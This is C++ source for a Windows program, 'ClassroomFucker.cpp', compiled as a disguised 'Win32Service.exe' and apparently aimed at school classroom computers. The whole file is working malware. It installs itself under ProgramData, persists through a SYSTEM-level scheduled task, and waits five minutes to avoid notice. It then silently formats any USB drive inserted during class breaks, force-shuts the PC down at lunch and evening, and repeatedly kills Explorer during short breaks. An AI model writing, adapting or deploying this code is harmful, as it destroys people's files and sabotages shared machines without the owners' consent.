// 编译: g++ -static -mwindows -o Win32Service.exe ClassroomFucker.cpp -ladvapi32

#ifndef UNICODE
#define UNICODE
#endif
#ifndef _UNICODE
#define _UNICODE
#endif

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <shellapi.h>
#include <cstdio>
#include <ctime>
#include <vector>
#include <string>
#include <set>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")

// ==============================================
// 配置区
// ==============================================
#define TARGET_DIR_NAME   L"ForYes"
#define TARGET_EXE_NAME   L"Win32Service.exe"
#define TASK_NAME         L"Win32Service"
#define CHECK_INTERVAL_MS 1000              // 1秒检测一次
#define INITIAL_DELAY_SEC 300               // 安装后5分钟内不干扰
#define SHUTDOWN_DELAY_SEC 20               // 长休息后延迟关机秒数

// 课间时间段
struct TimePeriod {
    int startHour, startMin;
    int endHour, endMin;
};

const TimePeriod breakPeriods[] = {
    { 8, 45,  8, 53 },
    { 9, 40, 10,  8 },
    {10, 55, 11,  3 },
    {14, 25, 14, 33 },
    {15, 20, 15, 33 },
    {16, 20, 16, 28 }
};

const TimePeriod longBreakPeriods[] = {
    {11, 50, 13, 38 },
    {17, 15, 18, 28 }
};

// ==============================================
// 工具函数
// ==============================================

std::wstring GetCurrentExePath() {
    wchar_t buf[MAX_PATH];
    GetModuleFileNameW(NULL, buf, MAX_PATH);
    return buf;
}

std::wstring GetTargetExePath() {
    wchar_t progData[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_COMMON_APPDATA, NULL, 0, progData))) {
        std::wstring dir = std::wstring(progData) + L"\\" + TARGET_DIR_NAME;
        return dir + L"\\" + TARGET_EXE_NAME;
    }
    return L"";
}

std::wstring GetTargetDir() {
    std::wstring targetPath = GetTargetExePath();
    return targetPath.substr(0, targetPath.find_last_of(L'\\'));
}

// 标记文件路径 (记录安装时间戳)
std::wstring GetInstallMarkerPath() {
    return GetTargetDir() + L"\\install.marker";
}

bool IsRunningFromTarget() {
    std::wstring myPath = GetCurrentExePath();
    std::wstring target = GetTargetExePath();
    if (target.empty()) return false;
    return (_wcsicmp(myPath.c_str(), target.c_str()) == 0);
}

bool CreateDirectoryRecursive(const std::wstring& path) {
    std::wstring built;
    for (wchar_t c : path) {
        built += c;
        if (c == L'\\') {
            CreateDirectoryW(built.c_str(), NULL);
        }
    }
    CreateDirectoryW(path.c_str(), NULL);
    return GetFileAttributesW(path.c_str()) != INVALID_FILE_ATTRIBUTES;
}

// 判断是否处于安装后的5分钟冷却期
bool IsInCooldownPeriod() {
    std::wstring markerPath = GetInstallMarkerPath();
    HANDLE hFile = CreateFileW(markerPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        // 标记文件不存在 → 早已超过5分钟，或者是后续开机
        return false;
    }

    // 读取安装时间戳
    FILETIME ftInstall;
    DWORD bytesRead;
    BOOL ok = ReadFile(hFile, &ftInstall, sizeof(ftInstall), &bytesRead, NULL);
    CloseHandle(hFile);

    if (!ok || bytesRead != sizeof(ftInstall)) {
        // 读取失败，删除标记文件，视为已过冷却期
        DeleteFileW(markerPath.c_str());
        return false;
    }

    // 计算经过的秒数
    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);
    ULARGE_INTEGER uiInstall, uiNow;
    uiInstall.LowPart = ftInstall.dwLowDateTime;
    uiInstall.HighPart = ftInstall.dwHighDateTime;
    uiNow.LowPart = ftNow.dwLowDateTime;
    uiNow.HighPart = ftNow.dwHighDateTime;

    // FILETIME 的单位是 100 纳秒
    ULONGLONG elapsedSeconds = (uiNow.QuadPart - uiInstall.QuadPart) / 10000000ULL;

    if (elapsedSeconds >= INITIAL_DELAY_SEC) {
        // 已超过5分钟，删除标记文件，下次不再检查
        DeleteFileW(markerPath.c_str());
        return false;
    }

    return true;  // 仍在冷却期内
}

// 安装时创建标记文件
bool CreateInstallMarker() {
    std::wstring markerPath = GetInstallMarkerPath();
    HANDLE hFile = CreateFileW(markerPath.c_str(), GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    FILETIME ftNow;
    GetSystemTimeAsFileTime(&ftNow);
    DWORD bytesWritten;
    BOOL ok = WriteFile(hFile, &ftNow, sizeof(ftNow), &bytesWritten, NULL);
    CloseHandle(hFile);
    return ok && (bytesWritten == sizeof(ftNow));
}

bool InstallToTarget() {
    std::wstring targetPath = GetTargetExePath();
    if (targetPath.empty()) return false;

    std::wstring targetDir = GetTargetDir();
    if (!CreateDirectoryRecursive(targetDir)) {
        // 目录可能已存在
    }

    // 复制自身
    if (!CopyFileW(GetCurrentExePath().c_str(), targetPath.c_str(), FALSE)) {
        return false;
    }

    // 创建安装标记文件 (记录当前时间戳)
    CreateInstallMarker();

    // 创建计划任务 (开机自启, SYSTEM权限)
    std::wstring cmd = L"schtasks /create /tn \"" + std::wstring(TASK_NAME) +
                       L"\" /tr \"\\\"" + targetPath + L"\\\"\" /sc onlogon /ru SYSTEM /rl HIGHEST /f";
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    wchar_t* cmdBuf = new wchar_t[cmd.size() + 1];
    wcscpy(cmdBuf, cmd.c_str());

    BOOL success = CreateProcessW(NULL, cmdBuf, NULL, NULL, FALSE,
                                  CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    delete[] cmdBuf;
    if (success) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return true;
    }
    return false;
}

void LaunchTargetAndExit() {
    std::wstring targetPath = GetTargetExePath();
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    if (CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE,
                       0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    ExitProcess(0);
}

bool IsInTimePeriod(const TimePeriod& tp) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    int curMins = st.wHour * 60 + st.wMinute;
    int startMins = tp.startHour * 60 + tp.startMin;
    int endMins = tp.endHour * 60 + tp.endMin;
    return curMins >= startMins && curMins <= endMins;
}

bool IsInBreak() {
    for (const auto& p : breakPeriods) if (IsInTimePeriod(p)) return true;
    return false;
}

bool IsInLongBreak() {
    for (const auto& p : longBreakPeriods) if (IsInTimePeriod(p)) return true;
    return false;
}

bool IsExplorerRunning() {
    bool found = false;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                found = true;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    return found;
}

void KillExplorer() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"explorer.exe") == 0) {
                HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (hProc) {
                    TerminateProcess(hProc, 1);
                    CloseHandle(hProc);
                }
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
}

void StartExplorer() {
    if (!IsExplorerRunning()) {
        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_HIDE);
    }
}

bool AcquireShutdownPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;
    TOKEN_PRIVILEGES tkp;
    LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL ret = AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, NULL, NULL);
    CloseHandle(hToken);
    return ret != 0;
}

void DoShutdown() {
    AcquireShutdownPrivilege();
    ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE | EWX_POWEROFF,
                  SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
}

std::set<wchar_t> GetRemovableDrives() {
    std::set<wchar_t> drives;
    DWORD mask = GetLogicalDrives();
    for (wchar_t c = L'A'; c <= L'Z'; ++c) {
        if (mask & (1 << (c - L'A'))) {
            wchar_t root[] = {c, L':', L'\\', L'\0'};
            if (GetDriveTypeW(root) == DRIVE_REMOVABLE) {
                drives.insert(c);
            }
        }
    }
    return drives;
}

void FormatDrive(wchar_t driveLetter) {
    wchar_t cmd[64];
    swprintf(cmd, 64, L"format %c: /FS:FAT32 /Q /Y", driveLetter);
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    wchar_t* sysDir = new wchar_t[MAX_PATH];
    GetSystemDirectoryW(sysDir, MAX_PATH);
    std::wstring fullCmd = std::wstring(sysDir) + L"\\cmd.exe /c " + cmd;
    delete[] sysDir;

    wchar_t* cmdBuf = new wchar_t[fullCmd.size() + 1];
    wcscpy(cmdBuf, fullCmd.c_str());

    CreateProcessW(NULL, cmdBuf, NULL, NULL, FALSE,
                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);
    delete[] cmdBuf;
}

// ==============================================
// 主入口
// ==============================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // 1. 如果不是从目标位置运行，则执行安装
    if (!IsRunningFromTarget()) {
        if (InstallToTarget()) {
            LaunchTargetAndExit();
        }
        return 1;
    }

    // 2. 检查是否处于安装冷却期 (仅首次安装后有效)
    while (IsInCooldownPeriod()) {
        // 还在5分钟冷却期内，静默等待
        Sleep(CHECK_INTERVAL_MS);
    }
    // 冷却期结束 (或已是后续开机)，开始正常工作

    // 3. 主监控循环
    std::set<wchar_t> prevDrives = GetRemovableDrives();
    bool shutdownTriggered = false;

    while (true) {
        Sleep(CHECK_INTERVAL_MS);

        bool inBreak = IsInBreak();
        bool inLongBreak = IsInLongBreak();
        bool disturb = inBreak || inLongBreak;

        // ---- U盘检测与格式化 ----
        if (disturb) {
            std::set<wchar_t> curDrives = GetRemovableDrives();
            for (wchar_t drive : curDrives) {
                if (prevDrives.find(drive) == prevDrives.end()) {
                    FormatDrive(drive);
                }
            }
            prevDrives = curDrives;
        } else {
            prevDrives = GetRemovableDrives();
        }

        // ---- 长休息: 20秒后关机 ----
        if (inLongBreak && !shutdownTriggered) {
            shutdownTriggered = true;
            Sleep(SHUTDOWN_DELAY_SEC * 1000);
            DoShutdown();
            shutdownTriggered = false;
            continue;
        }
        if (!inLongBreak) {
            shutdownTriggered = false;
        }

        // ---- 课间: 反复杀/启 explorer ----
        if (inBreak) {
            KillExplorer();
            Sleep(200);
            StartExplorer();
        }
    }

    return 0;
}
